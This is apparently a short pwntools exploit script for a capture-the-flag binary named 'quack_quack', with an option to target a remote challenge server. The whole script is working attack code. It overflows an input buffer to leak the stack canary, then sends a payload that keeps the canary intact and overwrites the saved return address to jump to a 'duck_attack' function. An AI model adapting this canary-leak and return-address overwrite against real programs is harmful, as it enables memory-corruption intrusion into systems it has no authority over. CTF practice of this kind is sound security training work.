from pwn import *

context.binary = elf = ELF("./quack_quack")
context.terminal = ['xfce4-terminal', '-e']
#context.log_level = 'debug'
#libc = ELF("libc.so.6")
if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
	p = gdb.debug([elf.path],'''
            b *main
            continue
        ''')
elif len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote('playground.tcp1p.team',19001)

else:
    p = process()

p.sendlineafter(b'> ',b'A'*(0x65 - len('Quack Quack ')) + b'Quack Quack ')
p.recvuntil(b'Quack Quack ')
a = u64(p.recv(7).rjust(8,b'\x00'))
print("canary",hex(a))

payload = flat({0x58:[a,0xdeadbeef,elf.sym.duck_attack]})
p.sendline(payload)

p.interactive()